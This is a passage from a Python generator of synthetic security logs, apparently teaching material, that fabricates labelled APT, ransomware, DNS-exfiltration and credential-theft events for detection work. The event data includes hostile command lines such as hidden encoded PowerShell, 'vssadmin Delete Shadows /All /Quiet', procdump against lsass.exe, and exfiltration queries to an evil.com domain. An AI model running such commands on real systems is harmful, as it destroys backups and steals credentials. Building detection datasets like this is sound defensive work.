        attacker_ip = self.generator.get_random_external_ip()
        target_host = self.generator.get_random_hostname("windows")
        malware_hash = hashlib.sha256(os.urandom(32)).hexdigest()

        stages = [
            (2, "Stage 1 - Reconnaissance", 5),
            (3, "Stage 2 - Brute Force", 20),
            (4, "Stage 3 - Initial Access (PowerShell)", 3),
            (5, "Stage 4 - Malware Download", 2),
            (6, "Stage 5 - Lateral Movement", 4),
            (7, "Stage 6 - Data Exfiltration", 1)
        ]

        for hour, stage, count in stages:
            for _ in range(count):
                ts = date.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59))
                self.log_gen.set_timestamp(ts)

                if "Reconnaissance" in stage:
                    e = self.log_gen.generate_zeek_dns()
                    e["dns"]["question"]["name"] = f"internal.{self.generator.domain_names[0]}"
                    e["source"]["ip"] = attacker_ip
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt"}
                    logs.append(e)

                elif "Brute Force" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 4625
                    e["winlog"]["event_data"] = {
                        "TargetUserName": employee["username"],
                        "TargetDomainName": "CORP",
                        "LogonType": "3",
                        "IpAddress": attacker_ip,
                        "AuthenticationPackageName": "NTLM"
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt"}
                    logs.append(e)

                elif "Initial Access" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_id"] = 1
                    e["winlog"]["event_data"] = {
                        "Image": "C:\\Windows\\System32\\powershell.exe",
                        "CommandLine": f"powershell -NoP -NonI -W Hidden -enc {uuid.uuid4().hex}",
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                        "User": f"CORP\\{employee['username']}",
                        "Hashes": f"SHA256={malware_hash}"
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt", "mitre_technique": "T1059.001"}
                    logs.append(e)

                elif "Malware Download" in stage:
                    e = self.log_gen.generate_network_log()
                    e["source"]["ip"] = self.generator.get_random_internal_ip()
                    e["destination"]["ip"] = attacker_ip
                    e["destination"]["port"] = 443
                    e["url"] = {"full": f"https://{attacker_ip}/stage2_{malware_hash[:8]}.exe"}
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt", "mitre_technique": "T1105"}
                    logs.append(e)

                elif "Lateral Movement" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 4648
                    e["winlog"]["event_data"] = {
                        "TargetUserName": employee["username"],
                        "TargetServerName": target_host,
                        "IpAddress": self.generator.get_random_internal_ip(),
                        "ProcessName": "C:\\Windows\\System32\\psexec.exe"
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt", "mitre_technique": "T1021"}
                    logs.append(e)

                elif "Exfiltration" in stage:
                    e = self.log_gen.generate_network_log()
                    e["source"]["ip"] = self.generator.get_random_internal_ip()
                    e["destination"]["ip"] = attacker_ip
                    e["network"]["bytes"] = random.randint(5_000_000, 50_000_000)
                    e["network"]["packets"] = random.randint(5000, 50000)
                    e["labels"] = {"attack_stage": stage, "attack_type": "apt", "mitre_technique": "T1041"}
                    logs.append(e)

        return logs

    def _scenario_ransomware(self, date: datetime.datetime) -> List[Dict]:
        """Ransomware scenario: delivery → execution → file encryption → ransom note."""
        logs = []
        employee = self.generator.get_random_employee()
        c2_ip = self.generator.get_random_external_ip()
        mal_hash = hashlib.sha256(os.urandom(32)).hexdigest()
        hostname = self.generator.get_random_hostname("windows")

        stages = [
            (8, "Phishing Email Delivery", 1),
            (8, "Malicious Attachment Execution", 2),
            (9, "C2 Beacon", 5),
            (9, "Lateral Movement via SMB", 10),
            (10, "Mass File Encryption", 50),
            (11, "Ransom Note Dropped", 1),
            (11, "Shadow Copies Deleted", 1)
        ]

        for hour, stage, count in stages:
            for _ in range(count):
                ts = date.replace(hour=hour, minute=random.randint(0, 59), second=random.randint(0, 59))
                self.log_gen.set_timestamp(ts)

                if "Phishing" in stage:
                    e = self.log_gen.generate_application_log()
                    e["email"] = {
                        "from": {"address": f"noreply@{random.choice(['evil.com','phish.net'])}"},
                        "to": [{"address": employee["email"]}],
                        "subject": "URGENT: Invoice attached",
                        "attachments": [{"file": {"name": "invoice.doc", "hash": {"sha256": mal_hash}}}]
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1566.001"}
                    logs.append(e)

                elif "Attachment" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_data"]["Image"] = "C:\\Windows\\System32\\cmd.exe"
                    e["winlog"]["event_data"]["ParentImage"] = "C:\\Program Files\\Microsoft Office\\WINWORD.EXE"
                    e["winlog"]["event_data"]["CommandLine"] = f"cmd.exe /c powershell -enc {uuid.uuid4().hex}"
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1204.002"}
                    logs.append(e)

                elif "C2 Beacon" in stage:
                    e = self.log_gen.generate_network_log()
                    e["source"]["ip"] = self.generator.get_random_internal_ip()
                    e["destination"]["ip"] = c2_ip
                    e["destination"]["port"] = random.choice([443, 8443, 4444])
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1071"}
                    logs.append(e)

                elif "SMB" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 5145
                    e["winlog"]["event_data"] = {
                        "ShareName": "\\\\*\\ADMIN$",
                        "IpAddress": self.generator.get_random_internal_ip(),
                        "SubjectUserName": employee["username"],
                        "RelativeTargetName": "..\\..\\Windows\\System32"
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1021.002"}
                    logs.append(e)

                elif "File Encryption" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_id"] = 11
                    ext = random.choice([".docx", ".xlsx", ".pdf", ".jpg", ".db"])
                    e["winlog"]["event_data"]["TargetFilename"] = f"C:\\Users\\{employee['username']}\\Documents\\file_{uuid.uuid4().hex[:6]}{ext}.locked"
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1486"}
                    logs.append(e)

                elif "Ransom Note" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_id"] = 11
                    e["winlog"]["event_data"]["TargetFilename"] = f"C:\\Users\\{employee['username']}\\Desktop\\HOW_TO_DECRYPT.txt"
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware"}
                    logs.append(e)

                elif "Shadow" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_id"] = 1
                    e["winlog"]["event_data"]["CommandLine"] = "vssadmin.exe Delete Shadows /All /Quiet"
                    e["winlog"]["event_data"]["Image"] = "C:\\Windows\\System32\\vssadmin.exe"
                    e["labels"] = {"attack_stage": stage, "attack_type": "ransomware", "mitre_technique": "T1490"}
                    logs.append(e)

        return logs

    def _scenario_data_exfiltration(self, date: datetime.datetime) -> List[Dict]:
        """Data exfiltration via DNS tunnelling (Ch 7 data + Ch 13 threat intel enrichment)."""
        logs = []
        attacker_domain = f"exfil-{uuid.uuid4().hex[:8]}.evil.com"
        src_ip = self.generator.get_random_internal_ip()

        for i in range(100):
            ts = date.replace(hour=random.randint(0, 23), minute=random.randint(0, 59), second=random.randint(0, 59))
            self.log_gen.set_timestamp(ts)
            e = self.log_gen.generate_zeek_dns()
            encoded_data = uuid.uuid4().hex[:32]
            e["dns"]["question"]["name"] = f"{encoded_data}.{attacker_domain}"
            e["dns"]["question"]["type"] = "TXT"
            e["source"]["ip"] = src_ip
            e["labels"] = {"attack_type": "data_exfiltration", "mitre_technique": "T1048.003", "dns_tunnelling": True}
            logs.append(e)

        return logs

    def _scenario_credential_theft(self, date: datetime.datetime) -> List[Dict]:
        """Credential theft via LSASS dump + Kerberoasting."""
        logs = []
        employee = self.generator.get_random_employee()
        hostname = self.generator.get_random_hostname("windows")
        attacker_ip = self.generator.get_random_internal_ip()

        steps = [
            (10, "LSASS Access", 3),
            (10, "Kerberoasting TGS Requests", 20),
            (11, "Pass the Hash Logon", 5),
            (11, "Privilege Escalation", 2)
        ]

        for hour, stage, count in steps:
            for _ in range(count):
                ts = date.replace(hour=hour, minute=random.randint(0, 59))
                self.log_gen.set_timestamp(ts)

                if "LSASS" in stage:
                    e = self.log_gen.generate_sysmon_event()
                    e["winlog"]["event_id"] = 10
                    e["winlog"]["event_data"] = {
                        "SourceImage": "C:\\Windows\\System32\\procdump64.exe",
                        "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                        "GrantedAccess": "0x1FFFFF",
                        "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll"
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "credential_theft", "mitre_technique": "T1003.001"}
                    logs.append(e)

                elif "Kerberoasting" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 4769
                    e["winlog"]["event_data"] = {
                        "ServiceName": f"HTTP/{self.generator.get_random_hostname('servers')}.internal.local",
                        "TargetUserName": employee["username"],
                        "TicketEncryptionType": "0x17",  # RC4-HMAC - weak, targeted by Kerberoasting
                        "IpAddress": attacker_ip
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "credential_theft", "mitre_technique": "T1558.003"}
                    logs.append(e)

                elif "Pass the Hash" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 4624
                    e["winlog"]["event_data"] = {
                        "TargetUserName": employee["username"],
                        "LogonType": "3",
                        "AuthenticationPackageName": "NTLM",
                        "IpAddress": attacker_ip,
                        "KeyLength": "0"  # PtH indicator
                    }
                    e["labels"] = {"attack_stage": stage, "attack_type": "credential_theft", "mitre_technique": "T1550.002"}
                    logs.append(e)

                elif "Privilege" in stage:
                    e = self.log_gen.generate_windows_event()
                    e["winlog"]["event_id"] = 4672
                    e["winlog"]["event_data"]["SubjectUserName"] = employee["username"]
                    e["labels"] = {"attack_stage": stage, "attack_type": "credential_theft", "mitre_technique": "T1078"}
                    logs.append(e)

        return logs


# ==================== MAIN ====================

if __name__ == "__main__":
    print("=== Cybersecurity Data Engineering - Historical Data Generator ===\n")
    print(f"Output: {CONFIG['output_dir']}")
    print(f"Days: {CONFIG['days_to_generate']} | Events/day: {CONFIG['events_per_day']}\n")

    gen = HistoricalDataGenerator()

    start = datetime.datetime.strptime(CONFIG["start_date"], "%Y-%m-%d")
    gen.generate_historical_range(start, CONFIG["days_to_generate"])

    print("\nGenerating attack scenarios...")
    scenarios = ["apt", "ransomware", "data_exfil", "cred_theft"]
    for scenario in scenarios:
        attack_date = start + datetime.timedelta(days=random.randint(0, CONFIG["days_to_generate"] - 1))
        gen.generate_attack_scenario(attack_date, scenario)

    print("\nHistorical data generation complete!")
    print(f"Output directory: {CONFIG['output_dir']}")
